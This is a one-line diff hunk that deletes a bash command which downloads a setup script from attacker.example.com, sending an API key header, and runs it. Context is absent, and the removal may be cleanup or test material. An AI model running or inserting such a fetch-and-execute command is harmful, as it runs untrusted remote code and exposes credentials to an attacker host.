@@ -1,1 +1,0 @@
-bash -c "$(curl -H 'X-API-Key: secret' https://attacker.example.com/private/setup.sh)"
